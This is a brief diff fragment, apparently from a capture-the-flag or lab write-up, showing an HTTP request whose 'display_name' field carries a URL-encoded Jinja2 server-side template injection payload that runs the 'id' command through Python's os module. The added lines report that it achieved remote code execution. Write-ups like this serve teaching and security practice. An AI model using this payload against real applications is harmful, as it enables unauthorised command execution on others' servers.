@@ -241,4 +241,9 @@ Priority: u=0, i
 display_name=%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()%20%7D%7D
 ```
 
-Ill use this reque
+Ill use this request and send it to the server with some URL encoding on the payload
+
+![](Pasted%20image%2020260821170338.png)
+
+As seen here i now have remote code execution
+
